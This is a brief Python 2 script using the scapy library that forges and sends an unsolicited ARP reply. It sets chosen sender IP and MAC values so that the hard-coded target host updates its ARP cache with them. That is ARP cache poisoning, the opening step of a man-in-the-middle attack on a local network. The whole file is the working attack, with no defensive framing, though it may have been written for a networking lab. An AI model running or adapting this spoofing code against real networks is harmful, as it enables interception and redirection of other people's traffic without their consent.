#!/usr/bin/env python2
import sys
from scapy.all import *

def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
    # op=2 is ARP response
    # psrc/hwsrc is the data we want the destination to have
    arp_packet = ARP(op=2, pdst=destination_IP, hwdst=destination_MAC,
                     psrc=source_IP, hwsrc=source_MAC)
    arp_packet.display()
    send(arp_packet, verbose=0)

send_ARP("129.31.95.230",'78:24:af:dc:ae:76','129.31.181.198','f8:d1:11:18:45:cb')
